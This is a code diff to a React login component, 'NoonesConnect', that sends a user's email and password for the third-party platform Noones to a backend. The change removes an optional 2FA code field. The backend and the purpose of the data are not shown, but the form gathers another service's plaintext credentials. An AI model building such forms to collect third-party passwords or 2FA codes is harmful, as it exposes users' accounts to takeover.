@@ -10,7 +10,6 @@ export default function NoonesConnect() {
   const [credentials, setCredentials] = useState({
     email: '',
     password: '',
-    code: '',
   });
 
   const handleFieldChange = (field: string) => (event: React.ChangeEvent<HTMLInputElement>) => {
@@ -36,7 +35,6 @@ export default function NoonesConnect() {
           platform: 'Noones',
           email,
           third_party_password: password,
-          code: credentials.code || null,
           user_id: session?.user?.id || null,
         }),
       });
@@ -119,17 +117,6 @@ export default function NoonesConnect() {
               <div className="flex justify-end">
                 <button type="button" className="text-[14px] font-bold hover:underline" style={{color: isDarkMode ? '#44C166' : '#18C37E'}}>Don't forget password?</button>
               </div>
-            </div>
-
-            <div className="space-y-2">
-              <label className={`block text-[14px] font-bold ${isDarkMode ? 'text-[#8F92A3]' : 'text-[#666A78]'}`}>2FA Code (optional)</label>
-              <input
-                type="text"
-                value={credentials.code}
-                onChange={handleFieldChange('code')}
-                placeholder="Enter 2FA code if required"
-                className={`${inputClasses} w-full h-[52px] px-4 rounded-xl border-none outline-none focus:ring-1 focus:ring-[#00c076] transition-all text-[16px]`}
-              />
             </div>
 
             {errorMessage && <p className="text-red-500 text-[13px] font-semibold text-center">{errorMessage}</p>}
